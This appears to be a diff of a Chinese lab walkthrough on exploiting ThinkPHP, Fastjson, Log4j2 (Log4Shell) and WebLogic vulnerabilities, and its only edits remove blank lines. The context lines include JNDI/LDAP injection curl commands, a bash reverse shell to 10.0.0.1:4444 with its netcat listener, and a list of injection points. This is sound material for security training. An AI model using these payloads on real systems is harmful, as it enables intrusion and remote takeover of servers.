@@ -49,7 +49,6 @@ Burp Suite / nc / curl / dig / nslookup
 2018 年 12 月 9 日，ThinkPHP 官方发布安全更新，修复了一处**框架层 RCE 漏洞**，编号 CNVD-2018-24942。
 
 漏洞根因：
-
 + 框架对 URL 路由参数解析不严
 + 用户可控的 `s` 参数被传入 `Controller::invokeMethod()`，导致可以调用任意类的任意方法
 + 配合 PHP 字符串解析特性，可拼接调用 `Request` 类的 `input` 方法 → 触发 `call_user_func` → 任意命令执行
@@ -251,13 +250,11 @@ nc -lvnp 4444
 # 第 3 关 Fastjson 1.2.24 / 1.2.47 JNDI 注入
 ## 3.1 产品介绍
 **Fastjson** 是阿里巴巴开源的 JSON 解析库，性能极高，被国内 Java 项目广泛使用。
-
 + GitHub：[https://github.com/alibaba/fastjson](https://github.com/alibaba/fastjson)
 + 提供序列化 / 反序列化、JSON Path、流式解析
 
 ## 3.2 漏洞背景
 Fastjson 的 `@type` 字段允许指定反序列化的目标类，框架会调用 setter 方法。安全研究员发现：
-
 + **1.2.24 之前**：完全没限制，任意类反序列化
 + 经典 gadget：`com.sun.rowset.JdbcRowSetImpl` 的 `setDataSourceName` + `setAutoCommit` → 触发 JNDI lookup → 加载远程恶意类 → RCE
 + **1.2.47 是绕过版**：通过缓存机制 `mapping` 绕过 1.2.25-1.2.46 的黑名单
@@ -273,7 +270,6 @@ Fastjson 的 `@type` 字段允许指定反序列化的目标类，框架会调�
 
 
 **利用条件**：
-
 + 服务端用 fastjson 解析用户可控的 JSON
 + Java 版本 < 8u191（JNDI 远程加载）或使用本地 gadget（TemplatesImpl）
 
@@ -334,7 +330,6 @@ Content-Type: application/json
 ```
 
 **原理**：
-
 + `java.lang.Class` 不在黑名单
 + 第一次解析把 `JdbcRowSetImpl` 加入全局缓存 `mapping`
 + 第二次直接使用缓存中的类，绕过黑名单检查
@@ -366,18 +361,14 @@ Content-Type: application/json
 # 第 4 关 Apache Log4j2 log4shell（CVE-2021-44228）
 ## 4.1 产品介绍
 **Apache Log4j2** 是 Java 生态最流行的日志组件，几乎每个 Java 项目都用它记录日志。
-
 log4j2:log for(four 谐音) java 2(第二代)
-
 + 提供分级日志（DEBUG / INFO / WARN / ERROR）
 + 支持格式化、过滤器、输出到文件/网络/数据库
 + 被 Spring / Hadoop / ElasticSearch / Solr / Struts 等无数项目依赖
 
 ## 4.2 漏洞背景
 2021 年 11 月 24 日，阿里云安全团队向 Apache 报告；12 月 9 日公开。
-
 漏洞原理：
-
 + Log4j2 支持 **Lookup** 语法：`${...}`
 + 包括 `${env:NAME}`（环境变量）、`${sys:property}`（系统属性）、`${jndi:...}`（JNDI 查询）
 + 日志内容被直接 Lookup 解析
@@ -395,9 +386,7 @@ log4j2:log for(four 谐音) java 2(第二代)
 | 2.16.0 | 仍有 CVE-2021-45105（DoS） |
 | 2.17.1+ | 安全 |
 
-
 **利用条件**：
-
 + 应用使用受影响 Log4j2 版本
 + 用户输入被记入日志
 + 出网（或使用本地 gadget + DNS 协议）
@@ -435,7 +424,6 @@ curl "http://target:8983/" -H "User-Agent: \${jndi:ldap://10.0.0.1:1389/abc123}"
 ```
 
 或更通用的：
-
 ```bash
 curl "http://target:8983/solr/admin/cores?action=\${jndi:ldap://10.0.0.1:1389/abc123}"
 ```
@@ -460,7 +448,6 @@ echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | base64
 
 ### 4.4.7 payload 位置汇总
 **所有会被记录的字段都试一遍**：
-
 ```plain
 User-Agent
 Referer
@@ -489,18 +476,15 @@ URL 路径
 # 第 5 关 WebLogic T3 / wls9-async 反序列化
 ## 5.1 产品介绍
 **Oracle WebLogic Server** 是企业级 Java EE 应用服务器，主要用于银行、保险、政府大型系统。
-
 + 提供 EJB、JMS、Web Service 容器
 + T3 协议是 WebLogic 私有协议，用于客户端与服务端通信
 + 默认端口 7001（Web）、IIOP（7002）
 
 ## 5.2 漏洞背景
 WebLogic 反序列化漏洞**系列**（CVE 众多），最经典两个：
-
 + **CVE-2018-2628**：T3 协议反序列化。攻击者发送特制 T3 请求，触发 `readObject`，配合 ysoserial gadget RCE。
 + **CVE-2019-2725**：`wls9-async` 组件反序列化。通过 `/_async/AsyncResponseService` 接口，无需 T3 协议，POST SOAP 报文即可。
 + 后续 CVE-2020-2551（IIOP）、CVE-2020-14882（控制台）等持续披露
-
 由于 WebLogic 部署在金融/政企核心系统，每次 CVE 都是行业震动。
 
 ## 5.3 利用条件与版本
@@ -512,7 +496,6 @@ WebLogic 反序列化漏洞**系列**（CVE 众多），最经典两个：
 
 
 **利用条件**：
-
 + 目标暴露 T3 端口（7001、7002）或 HTTP 接口
 + 无认证
 + classpath 中有可用 gadget
